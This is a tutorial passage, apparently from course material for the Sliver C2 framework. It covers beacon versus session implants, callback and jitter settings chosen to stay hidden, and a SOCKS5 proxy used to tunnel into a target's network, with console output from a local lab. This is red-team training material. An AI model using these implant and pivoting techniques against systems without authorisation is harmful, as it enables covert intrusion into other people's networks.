# This course is intended for the 1.6 version of Sliver, which is not yet published

Sliver implants support two types of connections, sessions and beacons.

Sessions use long-polling connections, which means they constantly maintain a single TCP connection open while communicating with the server. Beacons on the other hand call back periodically and will sleep when not active which can help keep their presence hidden. You could limit callbacks to once every 6 hours for example and only 'activate' the beacon when needed by switching its sleeping time to a shorter duration.

Typically during an engagement you will want to deploy a beacon on the target system and switch to a session while doing more active enumeration.

Let’s start with generating and deploying a beacon using `http`.

```asciinema
{"src": "/asciinema/beacon_generation.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

You can see the beacon callback times either in the `info` command or using `beacons watch`.

```bash
[server] sliver > beacons watch

 ID         Name            Transport   Username          Operating System   Last Check-In   Next Check-In
========== =============== =========== ================= ================== =============== ===============
 942c647c   TIRED_GIRAFFE   http(s)     tester   darwin/amd64       52s             12s

```

Beacon callback times and jitter can be set either during generation or on the fly using the `reconfig` command.

The example below sets the callback time to 5s with a 1s jitter.

```bash
[server] sliver (TIRED_GIRAFFE) > reconfig -i 5s -j 1s

[*] Tasked beacon TIRED_GIRAFFE (b8aa6fd8)

[+] TIRED_GIRAFFE completed task b8aa6fd8

[*] Reconfigured beacon

```

Commands issued for beacons can be viewed using `tasks`, the task state will indicate whether the command has completed or not.  The results of previously run tasks can be viewed using `tasks fetch`.

```asciinema
{"src": "/asciinema/beacon_tasks.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

Session can be spun up in our beacon process using the `interactive` command. Under the hood this will spawn a goroutine running session connection loop in the same beacon process.

```asciinema
{"src": "/asciinema/beacon_interractive.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

Because of the differences between sessions and beacons, certain commands like `upload` or `download` are slower on beacons due to the callback time. Others such as socks5 are only supported for sessions. As a rule of thumb anything requiring higher network bandwidth should be run from a session.

Let’s switch to our newly created session and spin-up a `socks5` proxy.

```bash

[server] sliver (TIRED_GIRAFFE) > use

? Select a session or beacon: SESSION  131a60b9  TIRED_GIRAFFE  127.0.0.1:51969  tester.local  tester  darwin/amd64
[*] Active session TIRED_GIRAFFE (131a60b9-db4f-4913-9064-18a17a0f09ab)

[server] sliver (TIRED_GIRAFFE) > socks5 start

[*] Started SOCKS5 127.0.0.1 1081
⚠️  In-band SOCKS proxies can be a little unstable depending on protocol
```

You can then point your browser to port 1081 to tunnel traffic through the implant to your target’s local network.

Try out some of the previous commands and compare behaviour on beacons and sessions. Once you are done, you should remember to close your session thread using the `close` command.
